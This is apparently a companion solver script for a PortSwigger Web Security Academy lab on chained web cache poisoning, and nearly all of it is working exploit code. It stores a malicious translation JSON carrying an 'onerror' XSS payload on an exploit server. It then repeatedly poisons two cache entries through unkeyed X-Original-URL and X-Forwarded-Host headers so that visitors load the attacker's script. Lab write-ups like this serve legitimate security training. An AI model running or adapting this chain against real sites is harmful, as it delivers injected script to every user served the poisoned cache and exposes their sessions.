#!/usr/bin/env python3
"""
Combining web cache poisoning vulnerabilities
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 11-combining-vulnerabilities.md

What this does:
    Chains two independently unkeyed headers toward two different goals.
    First, X-Original-URL: /setlang\\es (a BACKSLASH, not a forward slash --
    the cache evaluates that path differently and marks the resulting 302 as
    cacheable, where the forward-slash form isn't) poisons the home page with
    a redirect that silently sets an English-speaking victim's lang cookie to
    Spanish. Second, X-Forwarded-Host on /?localized=1 poisons the localized
    page's translation fetch to pull from the exploit server, which serves a
    malicious Spanish translation set with an XSS payload injected into the
    strings the page renders via innerHTML. Both poisoned entries expire
    independently, so this script keeps both warm on every cycle.

Usage:
    python 11-combining-vulnerabilities.py <lab-url> <exploit-server-url>
    e.g. python 11-combining-vulnerabilities.py https://0a1b...web-security-academy.net https://exploit-0a1c....exploit-server.net

Requirements:
    pip install httpx
"""

import asyncio
import json
import sys
from urllib.parse import urlparse
import httpx


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str, exploit_server: str) -> None:
    exploit_host = urlparse(exploit_server).hostname

    translations = json.dumps({
        "en": {"name": "English"},
        "es": {
            "name": "espanol",
            "translations": {
                "Return to list": "<img src=1 onerror='alert(document.cookie)'>",
                "View details": "<img src=1 onerror='alert(document.cookie)'>",
                "Description:": "<img src=1 onerror='alert(document.cookie)'>",
            },
        },
    })
    store_data = {
        "urlIsHttps": "on",
        "responseFile": "/resources/json/translations.json",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *",
        "responseBody": translations,
    }

    async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
        # Step 1: host the malicious Spanish translations.
        r_store = await client.post(f"{exploit_server}/store", data=store_data)
        if r_store.status_code in (200, 302):
            print("[+] Stored malicious translations.json on exploit server")
        else:
            print(f"[!] Store returned {r_store.status_code} -- may need browser")

        r_verify = await client.get(f"{exploit_server}/resources/json/translations.json")
        if r_verify.status_code == 200 and "onerror" in r_verify.text:
            print("[+] Verified: exploit server serves malicious JSON")
        else:
            print("[!] Verification failed -- check exploit server manually")

        # Step 2: dual-poison loop. Both cache entries have independent
        # TTLs (~30s), so they're fired concurrently every cycle rather than
        # alternating -- either one expiring alone breaks the chain.
        print("[*] Starting dual-poison loop...")
        print(r"    Poison 1: / + X-Original-URL: /setlang\es -> 302 (sets lang=es)")
        print(f"    Poison 2: /?localized=1 + X-Forwarded-Host: {exploit_host}")

        for cycle in range(60):
            r1, r2 = await asyncio.gather(
                client.get(f"{lab_url}/", headers={"X-Original-URL": "/setlang\\es"}),
                client.get(f"{lab_url}/?localized=1", headers={"X-Forwarded-Host": exploit_host}),
            )
            xc1 = r1.headers.get("x-cache", "")
            xc2 = r2.headers.get("x-cache", "")

            if cycle % 5 == 0 or "miss" in xc1.lower() or "miss" in xc2.lower():
                print(f"    Cycle {cycle + 1}: p1=[{r1.status_code} xc={xc1}] p2=[{r2.status_code} xc={xc2}]")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return

            await asyncio.sleep(3)

    print("[-] Not solved after 60 cycles")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <lab-url> <exploit-server-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/"), sys.argv[2].rstrip("/")))
